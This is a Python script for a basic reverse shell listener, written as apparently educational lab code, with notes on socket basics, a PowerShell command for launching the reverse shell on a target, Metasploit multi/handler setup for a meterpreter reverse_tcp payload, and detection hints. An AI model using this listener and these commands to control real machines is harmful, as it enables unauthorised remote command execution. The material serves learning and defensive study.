#!/usr/bin/env python3
"""
============================================================================
Basic Reverse Shell Listener - Educational Only!
============================================================================

Simple TCP listener for catching reverse shells in my lab.
Much simpler than Metasploit's multi/handler but works for learning.

⚠️  LAB USE ONLY

What this does:
- Listens on a port for incoming connections
- Accepts connection from reverse shell
- Lets you interact with the remote shell
- That's it - super basic

For real work: Use Metasploit's multi/handler!
This is just for understanding how listeners work under the hood.

============================================================================
"""

import socket
import sys
import argparse
from datetime import datetime


def print_banner():
    """Print a cool banner"""
    banner = """
    ╔════════════════════════════════════════════════════════════╗
    ║         BASIC REVERSE SHELL LISTENER - LAB ONLY            ║
    ╠════════════════════════════════════════════════════════════╣
    ║  Educational use only - isolated lab environment           ║
    ║  Learning how reverse shells work at the network level     ║
    ║                                                            ║
    ║  For real pentests: Use Metasploit multi/handler          ║
    ╚════════════════════════════════════════════════════════════╝
    """
    print(banner)


def start_listener(host, port):
    """
    Start a TCP listener to catch reverse shells

    This is the server side - waits for the reverse shell to connect back

    Args:
        host: IP to listen on (0.0.0.0 = all interfaces)
        port: Port to listen on

    How it works:
    1. Create TCP socket
    2. Bind to address:port
    3. Listen for incoming connections
    4. Accept connection
    5. Interactive shell session
    """

    print(f"[*] Starting listener...")
    print(f"[*] Address: {host}:{port}")
    print(f"[*] Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print()

    # ========================================================================
    # Step 1: Create the socket
    # ========================================================================
    print("[1] Creating TCP socket...")

    try:
        # AF_INET = IPv4, SOCK_STREAM = TCP
        # (SOCK_DGRAM would be UDP)
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # SO_REUSEADDR lets us reuse the port immediately
        # Without this, you'd have to wait if you restart the script
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        print("[+] Socket created")

    except Exception as e:
        print(f"[-] Socket creation failed: {e}")
        sys.exit(1)

    # ========================================================================
    # Step 2: Bind to address and port
    # ========================================================================
    print(f"[2] Binding to {host}:{port}...")

    try:
        # Bind "attaches" the socket to a specific address and port
        server_socket.bind((host, port))
        print(f"[+] Bound to {host}:{port}")

    except Exception as e:
        print(f"[-] Bind failed: {e}")
        print(f"[!] Port {port} might already be in use")
        print(f"[!] Try: sudo lsof -i :{port}")
        server_socket.close()
        sys.exit(1)

    # ========================================================================
    # Step 3: Listen for incoming connections
    # ========================================================================
    print("[3] Listening for connections...")

    try:
        # listen(1) = accept max 1 pending connection
        # For a simple listener, 1 is enough
        server_socket.listen(1)
        print(f"[+] Listening - waiting for connection...")
        print(f"[*] Run the reverse shell on the target now")
        print()

    except Exception as e:
        print(f"[-] Listen failed: {e}")
        server_socket.close()
        sys.exit(1)

    # ========================================================================
    # Step 4: Accept the connection
    # ========================================================================
    print("[4] Waiting for reverse shell connection...")

    try:
        # accept() BLOCKS here until a connection comes in
        # Returns: (client socket, client address)
        client_socket, client_address = server_socket.accept()

        print()
        print("[+] " + "="*60)
        print(f"[+] GOT A CONNECTION!")
        print(f"[+] From: {client_address[0]}:{client_address[1]}")
        print(f"[+] Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("[+] " + "="*60)
        print()

    except KeyboardInterrupt:
        print("\n[-] Interrupted (Ctrl+C)")
        server_socket.close()
        sys.exit(0)
    except Exception as e:
        print(f"[-] Accept failed: {e}")
        server_socket.close()
        sys.exit(1)

    # ========================================================================
    # Step 5: Interact with the shell
    # ========================================================================
    print("[5] Shell active - starting interaction")
    print()
    print("[*] Available commands:")
    print("    - help: Show help")
    print("    - exit: Close connection")
    print("    - <command>: Run on target")
    print()

    try:
        # Receive and display the banner from reverse shell
        banner = receive_until_prompt(client_socket)
        if banner:
            print(banner)

        # Main interaction loop
        while True:
            # Get the prompt from reverse shell (like "PS C:\> ")
            prompt = client_socket.recv(4096).decode('utf-8', errors='ignore')
            if not prompt:
                print("\n[-] Connection closed")
                break

            # Display the prompt
            print(prompt, end='', flush=True)

            # Read command from user (me)
            try:
                command = input()
            except EOFError:
                # Ctrl+D pressed
                print("\n[*] EOF detected - closing")
                command = "exit"

            # Send command to the reverse shell
            client_socket.send((command + "\n").encode('utf-8'))

            # If exit command, close cleanly
            if command.strip().lower() == 'exit':
                print("[*] Exit sent - closing...")
                break

            # Receive and display the result
            result = receive_until_prompt(client_socket)
            if result:
                print(result, end='')

            # If no more data, connection closed
            if not result:
                print("\n[-] Connection closed")
                break

    except KeyboardInterrupt:
        print("\n[*] Interrupted (Ctrl+C)")
    except Exception as e:
        print(f"\n[-] Error during interaction: {e}")
    finally:
        print("\n[*] Closing connection...")
        client_socket.close()
        server_socket.close()
        print("[+] Listener stopped")


def receive_until_prompt(sock, buffer_size=4096):
    """
    Receive data until we detect a prompt

    This is kinda hacky but works for basic shells.
    Proper implementation would be way more complex.

    Args:
        sock: Client socket
        buffer_size: Receive buffer size

    Returns:
        str: Data received
    """
    data = b""
    try:
        while True:
            chunk = sock.recv(buffer_size)
            if not chunk:
                break
            data += chunk

            # Simple heuristic: if ends with "> ", it's probably a prompt
            # This is super basic - could be improved but works for learning
            if data.endswith(b"> "):
                # Remove the final prompt
                data = data[:-2]
                break

            # Simple timeout: if less than full buffer, we probably got everything
            if len(chunk) < buffer_size:
                break

    except socket.timeout:
        pass
    except Exception as e:
        print(f"[-] Receive error: {e}")

    return data.decode('utf-8', errors='ignore')


def main():
    """Main function"""

    parser = argparse.ArgumentParser(
        description='Basic reverse shell listener for lab use only',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Listen on all interfaces, port 4444
  python listener.py -p 4444

  # Listen on specific interface
  python listener.py -H 192.168.100.10 -p 4444

IMPORTANT:
  - LAB USE ONLY
  - Isolated environment
  - For real pentests: Use Metasploit multi/handler

On the target Windows machine:
  powershell.exe -File basic-reverse-shell.ps1 -ListenerIP <IP> -ListenerPort <PORT>
        """
    )

    parser.add_argument(
        '-H', '--host',
        default='0.0.0.0',
        help='Listen IP address (default: 0.0.0.0 = all interfaces)'
    )

    parser.add_argument(
        '-p', '--port',
        type=int,
        required=True,
        help='Listen port (e.g., 4444)'
    )

    parser.add_argument(
        '-v', '--verbose',
        action='store_true',
        help='Verbose mode'
    )

    args = parser.parse_args()

    # Print banner
    print_banner()

    # Validate port
    if args.port < 1 or args.port > 65535:
        print(f"[-] Invalid port: {args.port}")
        print("[!] Port must be between 1 and 65535")
        sys.exit(1)

    # Check if privileged port (< 1024 needs root)
    if args.port < 1024:
        print(f"[!] WARNING: Port {args.port} is privileged")
        print(f"[!] May need sudo/root")
        print()

    # Start listener
    try:
        start_listener(args.host, args.port)
    except Exception as e:
        print(f"[-] Fatal error: {e}")
        sys.exit(1)


if __name__ == '__main__':
    main()


# ============================================================================
# MY NOTES
# ============================================================================

"""
HOW THIS WORKS:

1. TCP SOCKET BASICS:
   - socket() creates a communication endpoint
   - bind() attaches socket to an address:port
   - listen() puts it in listening mode
   - accept() waits for and accepts a connection (BLOCKS here)

2. INTERACTION:
   - recv() receives data from the connection
   - send() sends data to the connection
   - Loop until 'exit' or connection dies

3. ENCODING:
   - TCP sends bytes, not text
   - encode('utf-8') converts str -> bytes (for sending)
   - decode('utf-8') converts bytes -> str (for receiving)
   - Always need to convert!

WHY THIS IS SO SIMPLE:

This listener is intentionally basic for learning:
- Only handles one connection at a time
- No encryption whatsoever
- Minimal error handling
- No fancy logging
- receive_until_prompt() is hacky but works

FOR REAL PENTESTS - USE METASPLOIT:

Setting up multi/handler in Metasploit:

  msfconsole
  use exploit/multi/handler
  set payload windows/x64/meterpreter/reverse_tcp
  set LHOST <your-ip>
  set LPORT 4444
  exploit

WHY METASPLOIT IS BETTER:

- Handles multiple sessions
- Built-in post-exploitation
- Automatic logging
- Encryption available (reverse_https, reverse_winhttps)
- Clients accept it
- Tons of documentation

THINGS TO TRY:

- Run Wireshark while using this - see all the plaintext traffic
- Compare with Meterpreter's encrypted comms
- Add logging to this script (save all commands/output)
- Look at netstat -an to see the connection
- Learn Sysmon rules for detecting reverse shells

DETECTION:

This listener will show up in:
- netstat (port in LISTEN state)
- Firewall logs (if enabled)
- Network monitoring / IDS/IPS
- Once connected: suspicious outbound connection from target

TODO: Maybe add SSL/TLS support later for learning?
"""
